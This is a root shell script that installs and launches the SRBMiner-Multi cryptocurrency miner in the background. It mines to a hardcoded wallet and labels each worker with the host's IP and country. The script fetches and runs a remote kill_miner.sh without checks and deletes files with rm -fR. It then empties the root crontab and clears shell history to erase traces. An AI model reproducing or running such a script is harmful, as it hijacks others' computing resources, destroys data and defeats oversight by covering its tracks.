#!/bin/sh
IP4=$(curl -4 -s icanhazip.com)
convert_dots_to_underscore() {
    echo "$1" | tr '.' '-'
}
IP4_UNDERSCORE=$(convert_dots_to_underscore "$IP4")
password="danielchau@123#"
rm -fR /root/cpuminer-opt-linux/
rm -fv *
sudo apt-get update -y
sudo apt-get install cpulimit -y
sudo apt-get install shc jq -y
wget --no-check-certificate -O SRBMiner-Multi.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz
tar -xvf SRBMiner-Multi.tar.gz
chmod +x SRBMiner-Multi-2-4-6/*
mv /root/SRBMiner-Multi-2-4-6/SRBMiner-MULTI /root/SRBMiner-MULTI
cores=$(nproc --all)
#rounded_cores=$((cores * 9 / 10))
#read -p "What is pool? (exp: fr-zephyr.miningocean.org): " pool
limitCPU=$((cores * 80))
country=$(curl -s ipinfo.io | jq -r '.country')
#find best servers
servers=("stratum-eu.rplant.xyz" "stratum-asia.rplant.xyz" "stratum-na.rplant.xyz")
fastest_server="stratum-eu.rplant.xyz"
min_latency=999999
for server in "${servers[@]}"; do
    latency=$(ping -c 2 $server | awk '/^rtt/ { print $4 }' | cut -d '/' -f 2)
    if (( $(echo "$latency < $min_latency" | bc -l) )); then
        min_latency=$latency
        fastest_server=$server
    fi
done
echo "$fastest_server with min_latency is: $latency"

cat /dev/null > /root/danielluis1921.sh
cat >>/root/danielluis1921.sh <<EOF
#!/bin/bash
sudo ./kill_miner.sh
sleep 5
sudo ./SRBMiner-MULTI --background -t $cores -a ghostrider --pool $fastest_server:17054 --tls true --wallet RpmKEqqfCkrGMgHs8GiNkka7wmHp1o9StM.$IP4_UNDERSCORE-$country --keepalive true> /dev/null 2>&1 &
sleep 3
EOF

chmod +x /root/danielluis1921.sh

hostname=$(hostname)
if [ "$hostname" = "vultr" ];
then
  sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof SRBMiner-MULTI) > /dev/null 2>&1 &" danielluis1921.sh
  sed -i 's/Linode/Vultr/g' danielluis1921.sh
  sed -i 's/--keepalive true//g' danielluis1921.sh
else
  sed -i 's/stratum-asia/stratum-eu/g' danielluis1921.sh
  sed -i 's/stratum-na/stratum-eu/g' danielluis1921.sh
  echo "hostname isn't vultr"
fi

wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod +x /root/kill_miner.sh
./kill_miner.sh
sleep 3
./danielluis1921.sh
rm -fv *
rm -fR *
cat /dev/null > /var/spool/cron/crontabs/root
history -c && history -w
